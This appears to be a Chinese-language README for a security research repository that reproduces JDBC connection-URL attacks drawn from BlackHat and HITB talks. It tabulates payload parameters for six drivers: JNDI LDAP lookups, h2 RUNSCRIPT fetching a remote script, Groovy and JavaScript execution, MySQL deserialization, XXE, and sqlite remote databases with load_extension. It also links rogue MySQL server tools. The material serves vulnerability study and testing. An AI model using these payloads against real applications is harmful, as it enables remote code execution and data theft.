# JDBC Connection URL Attack

No one knows JDBC Connection URL like me.



## 前言

在 JDBC Connection URL 可控的情况下，攻击者可以进行什么样的攻击？

议题最开始在 BlackHat Europe 2019 上由 Back2Zero 团队给出演讲，后在 HITB SECCONF SIN-2021 上由 Litch1 & pyn3rd 进行了拓展和延伸。

以下为两次分享的 PPT 地址：

https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf

https://conference.hitb.org/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf

学习记录文章：https://su18.org/post/jdbc-connection-url-attack/

文章是对上面两篇演讲的学习和记录，在漏洞复现调试基础上查看、分析了一些关键的触发点和 sink 点，并在分享者视角之外提出了一些自己的看法。

本项目是漏洞复现和测试代码，已全部经过测试。欢迎下载学习和调试。



## 项目内容

本项目共包含 6 中常见的数据库链接项目的攻击方式（db2/derby/h2/modeshape/mysql/sqlite）。



### db2

| 参数     | 值                                                           |
| -------- | ------------------------------------------------------------ |
| 驱动名称 | `com.ibm.db2.jcc.DB2Driver`                                  |
| 攻击向量 | `clientRerouteServerListJNDIName`                            |
| 连接参数 | `:clientRerouteServerListJNDIName=ldap://127.0.0.1:23457/Command8;` |
| 备注     | `clientRerouteServerListJNDIName` 参数触发 JNDI 查询         |



### derby

| 参数     | 值                                                           |
| -------- | ------------------------------------------------------------ |
| 驱动名称 | `org.apache.derby.jdbc.EmbeddedDriver`                       |
| 攻击向量 | `slaveHost`                                                  |
| 连接参数 | `startMaster=true;slaveHost=127.0.0.1`                       |
| 备注     | `slaveHost` 参数触发与 slave server 的连接会从 slave 读取流并反序列化 |



### h2

RUNSCRIPT FROM remote

| 参数     | 值                                                          |
| -------- | ----------------------------------------------------------- |
| 驱动名称 | `org.h2.Driver`                                             |
| 攻击向量 | `RUNSCRIPT FROM`                                            |
| 连接参数 | `INIT=RUNSCRIPT FROM 'http://127.0.0.1:8001/poc.sql'`       |
| 备注     | 从远端获取 SQL，真正的执行 payload 是 `CREATE ALIAS`/`CALL` |

CREATE ALIAS Groovy

| 参数     | 值                                              |
| -------- | ----------------------------------------------- |
| 驱动名称 | `org.h2.Driver`                                 |
| 攻击向量 | `CREATE ALIAS AS`                               |
| 连接参数 | `@groovy.transform.ASTTest(value={ assert...})` |
| 备注     | 使 Driver 解析和执行 groovy 代码                |

CREATE TRIGGER JavaScript

| 参数     | 值                                   |
| -------- | ------------------------------------ |
| 驱动名称 | `org.h2.Driver`                      |
| 攻击向量 | `CREATE TRIGGER`                     |
| 连接参数 | `//javascript..`                     |
| 备注     | 使 Driver 解析和执行 javascript 代码 |



### modeshape

| 参数     | 值                                  |
| -------- | ----------------------------------- |
| 驱动名称 | `org.modeshape.jdbc.LocalJcrDriver` |
| 攻击向量 | `jcr:jndi:`                         |
| 连接参数 | `jdbc:jcr:jndi:ldap://...`          |
| 备注     | jcr 执行 jndi 查询                  |



### mysql

detectCustomCollations

| 参数     | 值                                                           |
| -------- | ------------------------------------------------------------ |
| 驱动名称 | `com.mysql.jdbc.Driver`                                      |
| 攻击向量 | `detectCustomCollations`                                     |
| 连接参数 | `autoDeserialize=true&detectCustomCollations=true`           |
| 备注     | `detectCustomCollations` 参数建立连接后执行 `SHOW COLLATION` 并反序列化结果 |



statementInterceptors

| 参数     | 值                                                           |
| -------- | ------------------------------------------------------------ |
| 驱动名称 | `com.mysql.jdbc.Driver`                                      |
| 攻击向量 | `statementInterceptors`                                      |
| 连接参数 | `statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor` |
| 备注     | `ServerStatusDiffInterceptor` 参数建立连接后执行 `SHOW SESSION STATUS` 并反序列化结果 |



fabric

| 参数     | 值                                                      |
| -------- | ------------------------------------------------------- |
| 驱动名称 | `com.mysql.fabric.jdbc.FabricMySQLDriver`               |
| 攻击向量 | `fabric://`                                             |
| 连接参数 | `jdbc:mysql:fabric://127.0.0.1:5000`                    |
| 备注     | `FabricMySQLDriver` 建立 XMLRPC 连接并解析造成 XXE 漏洞 |



### sqlite

| 参数     | 值                                                           |
| -------- | ------------------------------------------------------------ |
| 驱动名称 | `org.sqlite.JDBC`                                            |
| 攻击向量 | `:resource:`                                                 |
| 连接参数 | `:resource:http://127.0.0.1:8888/poc.db`                     |
| 备注     | `:resource:` 参数连接互联网的数据库，可以“替换”原有 SELECT 语句并使用 `load_extension` 加载恶意依赖文件/拒绝服务 |



以上详情请查看项目代码及学习文章。




## 致谢

感谢愿意分享的师傅们 Yongtao Wang, Lucas Zhang, Kevin Li ,Kunzhe Chai, Litch1 and pyn3rd 。



## 一些可能用到的项目

- https://github.com/fnmsd/MySQL_Fake_Server

- https://github.com/alibaba/cobar
- https://github.com/Gifts/Rogue-MySql-Server
- https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload
- https://github.com/su18/JNDI



